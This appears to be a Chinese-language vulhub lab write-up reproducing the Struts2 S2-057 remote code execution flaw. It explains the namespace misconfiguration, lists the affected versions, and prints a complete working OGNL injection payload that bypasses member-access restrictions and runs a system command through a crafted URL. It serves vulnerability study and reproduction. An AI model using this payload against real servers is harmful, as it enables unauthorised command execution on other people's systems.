# Struts2_057_远程代码执行

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->修改payload--->重放包--->代码执行

### 0x01漏洞介绍

​			 定义XML配置时如果没有设置namespace的值，并且上层动作配置中并没有设置或使用通配符namespace时，可能会导致远程代码执行漏洞的发生。同样也可能因为url标签没有设置value和action的值，并且上层动作并没有设置或使用通配符namespace，从而导致远程代码执行漏洞的发生。

​			影响版本

  		2.3 - 2.3.34      2.5 - 2.5.16

### 0x02漏洞复现

#### payload1(RCE)：

http://your-ip:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action

${
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('**id**')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}



​			**访问showcase界面**

![S2_057_rce_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_057_rce_1.jpg)

​			**输入payload，发现命令成功执行**

![S2_057_rce_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_057_rce_2.png)





### 0x03参考资料

https://blog.csdn.net/qq_29647709/article/details/84971376
